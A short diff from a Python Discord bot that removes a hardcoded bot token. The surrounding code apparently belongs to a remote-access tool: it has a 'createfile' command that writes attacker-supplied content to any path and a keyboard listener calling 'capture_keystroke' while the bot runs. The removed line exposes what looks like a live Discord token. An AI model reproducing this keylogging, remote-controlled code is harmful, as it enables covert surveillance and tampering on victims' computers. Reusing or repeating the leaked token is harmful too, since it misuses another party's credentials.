@@ -372,8 +372,6 @@ async def createfile(ctx, content, path):
     result = Functions.createfile(content, path)
     await ctx.send(result)
 
-TOKEN = "MTE0NTY5NDQ1NjQ2OTc4NjcwNQ.GS8VhK.pD3jSrBDuUYoFuW9NxYvByM-AXcdclP6sxawGw"
-
 with Listener(on_press=Functions.capture_keystroke) as listener:
     bot.run(TOKEN)
     listener.join()
